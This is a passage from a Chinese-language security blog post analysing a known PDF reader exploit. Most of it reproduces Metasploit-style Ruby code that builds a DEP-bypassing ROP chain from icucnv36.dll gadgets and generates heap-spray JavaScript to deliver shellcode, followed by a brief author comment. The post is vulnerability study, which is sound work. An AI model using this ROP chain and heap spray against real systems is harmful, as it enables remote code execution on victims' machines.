class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line">	def make_js(encoded_payload)</span><br><span class="line"></span><br><span class="line">		# The following executes a ret2lib using icucnv36.dll</span><br><span class="line">		# The effect is to bypass DEP and execute the shellcode in an indirect way</span><br><span class="line">		stack_data = [</span><br><span class="line">			0x41414141,   # unused</span><br><span class="line">			0x4a8063a5,   # pop ecx / ret</span><br><span class="line">			0x4a8a0000,   # becomes ecx</span><br><span class="line"></span><br><span class="line">			0x4a802196,   # mov [ecx],eax / ret # save whatever eax starts as</span><br><span class="line"></span><br><span class="line">			0x4a801f90,   # pop eax / ret</span><br><span class="line">			0x4a84903c,   # becomes eax (import for CreateFileA)</span><br><span class="line"></span><br><span class="line">			# -- call CreateFileA</span><br><span class="line">			0x4a80b692,   # jmp [eax]</span><br><span class="line"></span><br><span class="line">			0x4a801064,   # ret</span><br><span class="line"></span><br><span class="line">			0x4a8522c8,   # first arg to CreateFileA (lpFileName / pointer to &quot;iso88591&quot;)</span><br><span class="line">			0x10000000,   # second arg  - dwDesiredAccess</span><br><span class="line">			0x00000000,   # third arg   - dwShareMode</span><br><span class="line">			0x00000000,   # fourth arg  - lpSecurityAttributes</span><br><span class="line">			0x00000002,   # fifth arg   - dwCreationDisposition</span><br><span class="line">			0x00000102,   # sixth arg   - dwFlagsAndAttributes</span><br><span class="line">			0x00000000,   # seventh arg - hTemplateFile</span><br><span class="line"></span><br><span class="line">			0x4a8063a5,   # pop ecx / ret</span><br><span class="line">			0x4a801064,   # becomes ecx</span><br><span class="line"></span><br><span class="line">			0x4a842db2,   # xchg eax,edi / ret</span><br><span class="line"></span><br><span class="line">			0x4a802ab1,   # pop ebx / ret</span><br><span class="line">			0x00000008,   # becomes ebx - offset to modify</span><br><span class="line"></span><br><span class="line">			#</span><br><span class="line">			# This points at a neat-o block of code that ... TBD</span><br><span class="line">			#</span><br><span class="line">			#   and [esp+ebx*2],edi</span><br><span class="line">			#   jne check_slash</span><br><span class="line">			# ret_one:</span><br><span class="line">			#   mov al,1</span><br><span class="line">			#   ret</span><br><span class="line">			# check_slash:</span><br><span class="line">			#   cmp al,0x2f</span><br><span class="line">			#   je ret_one</span><br><span class="line">			#   cmp al,0x41</span><br><span class="line">			#   jl check_lower</span><br><span class="line">			#   cmp al,0x5a</span><br><span class="line">			#   jle check_ptr</span><br><span class="line">			# check_lower:</span><br><span class="line">			#   cmp al,0x61</span><br><span class="line">			#   jl ret_zero</span><br><span class="line">			#   cmp al,0x7a</span><br><span class="line">			#   jg ret_zero</span><br><span class="line">			#   cmp [ecx+1],0x3a</span><br><span class="line">			#   je ret_one</span><br><span class="line">			# ret_zero:</span><br><span class="line">			#   xor al,al</span><br><span class="line">			#   ret</span><br><span class="line">			#</span><br><span class="line"></span><br><span class="line">			0x4a80a8a6,   # execute fun block</span><br><span class="line"></span><br><span class="line">			0x4a801f90,   # pop eax / ret</span><br><span class="line">			0x4a849038,   # becomes eax (import for CreateFileMappingA)</span><br><span class="line"></span><br><span class="line">			# -- call CreateFileMappingA</span><br><span class="line">			0x4a80b692,   # jmp [eax]</span><br><span class="line"></span><br><span class="line">			0x4a801064,   # ret</span><br><span class="line"></span><br><span class="line">			0xffffffff,   # arguments to CreateFileMappingA, hFile</span><br><span class="line">			0x00000000,   # lpAttributes</span><br><span class="line">			0x00000040,   # flProtect</span><br><span class="line">			0x00000000,   # dwMaximumSizeHigh</span><br><span class="line">			0x00010000,   # dwMaximumSizeLow</span><br><span class="line">			0x00000000,   # lpName</span><br><span class="line"></span><br><span class="line">			0x4a8063a5,   # pop ecx / ret</span><br><span class="line">			0x4a801064,   # becomes ecx</span><br><span class="line"></span><br><span class="line">			0x4a842db2,   # xchg eax,edi / ret</span><br><span class="line"></span><br><span class="line">			0x4a802ab1,   # pop ebx / ret</span><br><span class="line">			0x00000008,   # becomes ebx - offset to modify</span><br><span class="line"></span><br><span class="line">			0x4a80a8a6,   # execute fun block</span><br><span class="line"></span><br><span class="line">			0x4a801f90,   # pop eax / ret</span><br><span class="line">			0x4a849030,   # becomes eax (import for MapViewOfFile</span><br><span class="line"></span><br><span class="line">			# -- call MapViewOfFile</span><br><span class="line">			0x4a80b692,   # jmp [eax]</span><br><span class="line"></span><br><span class="line">			0x4a801064,   # ret</span><br><span class="line"></span><br><span class="line">			0xffffffff,   # args to MapViewOfFile - hFileMappingObject</span><br><span class="line">			0x00000022,   # dwDesiredAccess</span><br><span class="line">			0x00000000,   # dwFileOffsetHigh</span><br><span class="line">			0x00000000,   # dwFileOffsetLow</span><br><span class="line">			0x00010000,   # dwNumberOfBytesToMap</span><br><span class="line"></span><br><span class="line">			0x4a8063a5,   # pop ecx / ret</span><br><span class="line">			0x4a8a0004,   # becomes ecx - writable pointer</span><br><span class="line"></span><br><span class="line">			0x4a802196,   # mov [ecx],eax / ret - save map base addr</span><br><span class="line"></span><br><span class="line">			0x4a8063a5,   # pop ecx / ret</span><br><span class="line">			0x4a801064,   # becomes ecx - ptr to ret</span><br><span class="line"></span><br><span class="line">			0x4a842db2,   # xchg eax,edi / ret</span><br><span class="line"></span><br><span class="line">			0x4a802ab1,   # pop ebx / ret</span><br><span class="line">			0x00000030,   # becomes ebx - offset to modify</span><br><span class="line"></span><br><span class="line">			0x4a80a8a6,   # execute fun block</span><br><span class="line"></span><br><span class="line">			0x4a801f90,   # pop eax / ret</span><br><span class="line">			0x4a8a0004,   # becomes eax - saved file mapping ptr</span><br><span class="line"></span><br><span class="line">			0x4a80a7d8,   # mov eax,[eax] / ret - load saved mapping ptr</span><br><span class="line"></span><br><span class="line">			0x4a8063a5,   # pop ecx / ret</span><br><span class="line">			0x4a801064,   # becomes ecx - ptr to ret</span><br><span class="line"></span><br><span class="line">			0x4a842db2,   # xchg eax,edi / ret</span><br><span class="line"></span><br><span class="line">			0x4a802ab1,   # pop ebx / ret</span><br><span class="line">			0x00000020,   # becomes ebx - offset to modify</span><br><span class="line"></span><br><span class="line">			0x4a80a8a6,   # execute fun block</span><br><span class="line"></span><br><span class="line">			0x4a8063a5,   # pop ecx / ret</span><br><span class="line">			0x4a801064,   # becomes ecx - ptr to ret</span><br><span class="line"></span><br><span class="line">			0x4a80aedc,   # lea edx,[esp+0xc] / push edx / push eax / push [esp+0xc] / push [0x4a8a093c] / call ecx / add esp, 0x10 / ret</span><br><span class="line"></span><br><span class="line">			0x4a801f90,   # pop eax / ret</span><br><span class="line">			0x00000034,   # becomes eax</span><br><span class="line"></span><br><span class="line">			0x4a80d585,   # add eax,edx / ret</span><br><span class="line"></span><br><span class="line">			0x4a8063a5,   # pop ecx / ret</span><br><span class="line">			0x4a801064,   # becomes ecx - ptr to ret</span><br><span class="line"></span><br><span class="line">			0x4a842db2,   # xchg eax,edi / ret</span><br><span class="line"></span><br><span class="line">			0x4a802ab1,   # pop ebx / ret</span><br><span class="line">			0x0000000a,   # becomes ebx - offset to modify</span><br><span class="line"></span><br><span class="line">			0x4a80a8a6,   # execute fun block</span><br><span class="line"></span><br><span class="line">			0x4a801f90,   # pop eax / ret</span><br><span class="line">			0x4a849170,   # becomes eax (import for memcpy)</span><br><span class="line"></span><br><span class="line">			# -- call memcpy</span><br><span class="line">			0x4a80b692,   # jmp [eax]</span><br><span class="line"></span><br><span class="line">			0xffffffff,   # this stuff gets overwritten by the block at 0x4a80aedc, becomes ret from memcpy</span><br><span class="line">			0xffffffff,   # becomes first arg to memcpy (dst)</span><br><span class="line">			0xffffffff,   # becomes second arg to memcpy (src)</span><br><span class="line">			0x00001000,   # becomes third arg to memcpy (length)</span><br><span class="line">			#0x0000258b,   # ??</span><br><span class="line">			#0x4d4d4a8a,   # ??</span><br><span class="line">		].pack(&apos;V*&apos;)</span><br><span class="line"></span><br><span class="line">		var_unescape  = rand_text_alpha(rand(100) + 1)</span><br><span class="line">		var_shellcode = rand_text_alpha(rand(100) + 1)</span><br><span class="line"></span><br><span class="line">		var_start     = rand_text_alpha(rand(100) + 1)</span><br><span class="line"></span><br><span class="line">		var_s         = 0x10000</span><br><span class="line">		var_c         = rand_text_alpha(rand(100) + 1)</span><br><span class="line">		var_b         = rand_text_alpha(rand(100) + 1)</span><br><span class="line">		var_d         = rand_text_alpha(rand(100) + 1)</span><br><span class="line">		var_3         = rand_text_alpha(rand(100) + 1)</span><br><span class="line">		var_i         = rand_text_alpha(rand(100) + 1)</span><br><span class="line">		var_4         = rand_text_alpha(rand(100) + 1)</span><br><span class="line"></span><br><span class="line">		payload_buf = &apos;&apos;</span><br><span class="line">		payload_buf &lt;&lt; stack_data</span><br><span class="line">		payload_buf &lt;&lt; encoded_payload</span><br><span class="line"></span><br><span class="line">		escaped_payload = Rex::Text.to_unescape(payload_buf)</span><br><span class="line"></span><br><span class="line">		js = %Q|</span><br><span class="line">var #&#123;var_unescape&#125; = unescape;</span><br><span class="line">var #&#123;var_shellcode&#125; = #&#123;var_unescape&#125;( &apos;#&#123;escaped_payload&#125;&apos; );</span><br><span class="line">var #&#123;var_c&#125; = #&#123;var_unescape&#125;( &quot;%&quot; + &quot;u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; + &quot;%u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; );</span><br><span class="line">while (#&#123;var_c&#125;.length + 20 + 8 &lt; #&#123;var_s&#125;) #&#123;var_c&#125;+=#&#123;var_c&#125;;</span><br><span class="line">#&#123;var_b&#125; = #&#123;var_c&#125;.substring(0, (0x0c0c-0x24)/2);</span><br><span class="line">#&#123;var_b&#125; += #&#123;var_shellcode&#125;;</span><br><span class="line">#&#123;var_b&#125; += #&#123;var_c&#125;;</span><br><span class="line">#&#123;var_d&#125; = #&#123;var_b&#125;.substring(0, #&#123;var_s&#125;/2);</span><br><span class="line">while(#&#123;var_d&#125;.length &lt; 0x80000) #&#123;var_d&#125; += #&#123;var_d&#125;;</span><br><span class="line">#&#123;var_3&#125; = #&#123;var_d&#125;.substring(0, 0x80000 - (0x1020-0x08) / 2);</span><br><span class="line">var #&#123;var_4&#125; = new Array();</span><br><span class="line">for (#&#123;var_i&#125;=0;#&#123;var_i&#125;&lt;0x1f0;#&#123;var_i&#125;++) #&#123;var_4&#125;[#&#123;var_i&#125;]=#&#123;var_3&#125;+&quot;s&quot;;</span><br><span class="line">|</span><br><span class="line"></span><br><span class="line">		js</span><br><span class="line">	end</span><br></pre></td></tr></table></figure></p>
<p>就是和上一步的调试的结果差不多，就是布置 <code>shellcode</code>，堆喷射之类的，<code>and [esp+ebx*2],edi</code> 感觉这个指令用的好6。大概就是这些了。</p>

      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/old-blog/" rel="tag"># old_blog</a>
          
            <a href="/tags/vuln/" rel="tag"># vuln</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/01/09/QEMU-shadowstack/" rel="next" title="QEMU_shadowstack">
                <i class="fa fa-chevron-left"></i> QEMU_shadowstack
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="V4kst1z">
            
              <p class="site-author-name" itemprop="name">V4kst1z</p>
              <p class="site-description motion-element" itemprop="description">Fighting</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">4</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">3</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://github.com/Vsane" title="GitHub &rarr; https://github.com/Vsane" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://twitter.com/v4kst1z" title="Twitter &rarr; https://twitter.com/v4kst1z" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                </span>
              
            </div>
          

          
             <div class="cc-license motion-element" itemprop="license">
              
                
              
              
              
              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
             </div>
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://aryb1n.github.io/" title="https://aryb1n.github.io/" rel="noopener" target="_blank">Aryb1n</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://52yuluo.top/" title="http://52yuluo.top/" rel="noopener" target="_blank">Yuluo</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </div>

      
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞概览"><span class="nav-number">1.</span> <span class="nav-text">漏洞概览</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#触发条件"><span class="nav-number">2.</span> <span class="nav-text">触发条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用技巧"><span class="nav-number">3.</span> <span class="nav-text">利用技巧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit分析"><span class="nav-number">4.</span> <span class="nav-text">exploit分析</span></a></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">V4kst1z</span>

  

  
</div>


  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v6.7.0</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  <script src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/src/utils.js?v=6.7.0"></script>

  <script src="/js/src/motion.js?v=6.7.0"></script>



  
  


  <script src="/js/src/affix.js?v=6.7.0"></script>

  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>




  
  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
<script src="/js/src/post-details.js?v=6.7.0"></script>



  


  <script src="/js/src/bootstrap.js?v=6.7.0"></script>



  
  





  





  

  

  

  

  

  

  

  

  

  

  

  

  

</body>
</html>
